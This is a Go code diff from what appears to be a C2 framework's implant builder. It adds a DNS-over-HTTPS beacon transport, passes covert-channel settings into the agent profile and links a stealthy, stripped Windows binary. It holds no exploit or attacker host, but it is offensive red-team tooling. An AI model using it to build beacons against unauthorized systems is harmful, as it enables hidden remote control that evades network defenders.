@@ -42,6 +42,7 @@ var (
 	ObjectDir_smb  = "objects_smb"
 	ObjectDir_tcp  = "objects_tcp"
 	ObjectDir_dns  = "objects_dns"
+	ObjectDir_doh  = "objects_doh"
 	ObjectFiles    = [...]string{"Agent", "AgentConfig", "AgentInfo", "ApiLoader", "beacon_functions", "Boffer", "Commander", "Crypt", "Downloader", "Encoders", "JobsController", "MainAgent", "MemorySaver", "Packer", "Pivotter", "ProcLoader", "Proxyfire", "std", "utils", "WaitMask"}
 	CFlags         = "-c -fno-builtin -fno-unwind-tables -fno-strict-aliasing -fno-ident -fno-stack-protector -fno-exceptions -fno-asynchronous-unwind-tables -fno-strict-overflow -fno-delete-null-pointer-checks -fpermissive -w -masm=intel -fPIC"
 	LFlags         = "-Os -s -Wl,-s,--gc-sections -static-libgcc -mwindows"
@@ -236,6 +237,41 @@ func AgentGenerateProfile(agentConfig string, listenerWM string, listenerMap map
 		params = append(params, seconds)
 		params = append(params, generateConfig.Jitter)
 
+	case "doh":
+		domain, _ := listenerMap["domain"].(string)
+		urls, _ := listenerMap["doh_urls"].(string)
+		user_agent, _ := listenerMap["user_agent"].(string)
+		pkt_size_f, _ := listenerMap["pkt_size"].(float64)
+		ttl_f, _ := listenerMap["ttl"].(float64)
+		label_size_f, _ := listenerMap["label_size"].(float64)
+
+		pkt_size := int(pkt_size_f)
+		ttl := int(ttl_f)
+		label_size := int(label_size_f)
+		if label_size <= 0 || label_size > 63 {
+			label_size = 48
+		}
+
+		seconds, err := parseDurationToSeconds(generateConfig.Sleep)
+		if err != nil {
+			return nil, err
+		}
+
+		lWatermark, _ := strconv.ParseInt(listenerWM, 16, 64)
+
+		params = append(params, int(agentWatermark))
+		params = append(params, domain)
+		params = append(params, urls)
+		params = append(params, user_agent)
+		params = append(params, pkt_size)
+		params = append(params, label_size)
+		params = append(params, ttl)
+		params = append(params, int(lWatermark))
+		params = append(params, kill_date)
+		params = append(params, working_time)
+		params = append(params, seconds)
+		params = append(params, generateConfig.Jitter)
+
 	default:
 		return nil, errors.New("protocol unknown")
 	}
@@ -310,6 +346,11 @@ func AgentGenerateBuild(agentConfig string, agentProfile []byte, listenerMap map
 		// ConnectorDNS uses Winsock APIs like htons/ntohs, so we must
 		// link against ws2_32 to resolve __imp_htons and related symbols.
 		extraLibs = "-lws2_32"
+	} else if protocol == "doh" {
+		ObjectDir = ObjectDir_doh
+		ConnectorFile = "ConnectorDoH"
+		// ConnectorDoH uses WinINet
+		extraLibs = "-lwininet"
 	} else {
 		return nil, "", errors.New("protocol unknown")
 	}
@@ -352,8 +393,8 @@ func AgentGenerateBuild(agentConfig string, agentProfile []byte, listenerMap map
 	for _, ofile := range ObjectFiles {
 		Files += ObjectDir + "/" + ofile + Ext + " "
 	}
-	// 仅 DNS beacon 需要会话层压缩模块及其 miniz 实现，其它协议不链接，避免体积增加。
-	if protocol == "dns" {
+	// 仅 DNS/DoH beacon 需要会话层压缩模块及其 miniz 实现，其它协议不链接，避免体积增加。
+	if protocol == "dns" || protocol == "doh" {
 		Files += ObjectDir + "/DnsCompression" + Ext + " "
 		Files += ObjectDir + "/miniz" + Ext + " "
 	}
